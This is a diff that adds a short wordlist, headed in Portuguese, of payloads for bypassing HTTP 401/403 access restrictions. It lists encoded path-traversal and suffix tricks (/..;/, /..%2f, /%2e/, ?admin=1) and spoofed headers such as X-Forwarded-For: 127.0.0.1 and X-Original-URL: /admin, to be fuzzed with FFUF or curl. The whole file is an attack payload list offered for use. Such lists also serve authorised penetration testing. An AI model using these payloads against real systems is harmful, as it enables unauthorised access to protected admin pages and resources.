@@ -1,0 +1,31 @@
+# Payloads de Bypass de Elite (403/401)
+/%2e/
+/./
+/..;/
+/..%2f
+/..%5c
+/%2f/
+/%20/
+/%09/
+/??
+/???
+/
+/.html
+/.php
+/.json
+/.xml
+/index.php
+/index.html
+?
+??
+?debug=1
+?admin=1
+?test=1
+# Cabeçalhos para testar via FFUF/Curl
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Custom-IP-Authorization: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
